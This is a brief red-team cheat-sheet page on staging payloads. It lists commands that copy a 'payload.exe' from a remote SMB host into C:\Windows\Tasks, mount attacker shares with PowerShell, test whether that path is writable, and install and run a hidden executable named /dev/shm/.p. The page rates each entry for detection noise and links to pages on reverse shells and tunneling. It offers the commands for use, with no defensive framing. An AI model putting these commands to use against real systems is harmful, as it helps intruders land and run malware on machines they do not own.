# Staging & File Transfer

Short staging and non-HTTP file-transfer helpers.

<div class="ol-section-kicker"><span>RT</span><strong>Staging</strong></div>

## SMB copy to Windows Tasks

```cmd
copy \\<HOST>\share\payload.exe C:\Windows\Tasks\payload.exe
```

**Tool:** SMB · **Platform:** Windows · **Tags:** SMB, File Transfer, Staging · **Context:** User · **Noise:** Moderate

## Mount SMB share with PowerShell

```powershell
New-PSDrive -Name X -PSProvider FileSystem -Root \\<HOST>\share
```

**Tool:** PowerShell · **Platform:** Windows · **Tags:** SMB, File Transfer · **Context:** User · **Noise:** Moderate

## Test Windows Tasks write access

```powershell
$p='C:\Windows\Tasks\ol-test.tmp';'test'|Set-Content $p;Get-Item $p;Remove-Item $p
```

**Tool:** PowerShell · **Platform:** Windows · **Tags:** Staging, Writable Path · **Context:** User · **Noise:** Moderate

## Stage executable in /dev/shm

```bash
install -m 700 <FILE> /dev/shm/.p && /dev/shm/.p
```

**Tool:** install · **Platform:** Linux · **Tags:** tmpfs, Staging, Execution · **Context:** User · **Noise:** Moderate

## Check /dev/shm mount

```bash
findmnt /dev/shm -o TARGET,FSTYPE,OPTIONS
```

**Tool:** findmnt · **Platform:** Linux · **Tags:** tmpfs, Mounts · **Context:** User · **Noise:** Moderate

!!! note "Path visibility"
    `C:\Windows\Tasks` and `/dev/shm` are familiar investigation locations. Treat them as convenient staging paths, not stealth guarantees.

---

**Related:** [Overview](./) · [Reverse Shells](reverse-shells.md) · [Tunneling](tunneling.md)
